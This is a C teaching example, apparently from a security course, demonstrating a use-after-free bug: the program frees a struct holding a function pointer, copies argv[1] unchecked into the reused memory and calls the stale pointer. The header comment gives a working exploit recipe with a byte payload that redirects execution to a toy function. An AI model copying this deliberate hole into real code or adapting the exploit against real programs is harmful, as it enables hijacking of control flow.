/* This example is a bit less complicated than the stack smashing one.
 * First you need to compile the executable statically to have a deterministic
 * and easy to identify address for security_critical_function:
 * gcc use-after-free.c -g -o use-after-free -static
 *
 * then use nm to find that address:
 * nm use-after-free | grep security_critical_function
 *
 * on my computer I get:
 * 000000000040167c T security_critical_function
 *
 * I then used GDB to explore where malloc allocates the data structure pointed
 * by ms and later the area pointed by buffer: it turns out that it is the same
 * address. So when we overflow buffer we want to write 0x40167c where the
 * function pointer would be when this area is (wrongly) interpreted as a ms
 * structure, i.e. at an 8 bytes (member1) + 8 bytes (member2) == 16 bytes
 * offset from buffer.
 * Then we can craft and inject our payload made of 16 bytes of garbage followed
 * by 0x40167c:
 * echo -e "\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x7c\x16\x40\x00\x00\x00\x00\x00" | xargs --null -t -n1 ./use-after-free
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef struct {
    double member1;
    double member2;
    void (*member3)(int);
} my_struct;

void print_hello(int x) {
    printf("Hello, parameter: %d\n", x);
}

void security_critical_function() {
    printf("Launching nukes!\n");
    /* ... */
}

int main(int argc, char **argv) {

    /* allocate and init ms */
    my_struct *ms = malloc(sizeof(my_struct));
    ms->member1 = 42.0; ms->member2 = 42.0;
    ms->member3 = &print_hello;

    /* call the function pointer */
    ms->member3(12);

    free(ms);

    char *buffer = malloc(12);
    strcpy(buffer, argv[1]);

    ms->member3(12); // Oopsie!
    exit(0);
}

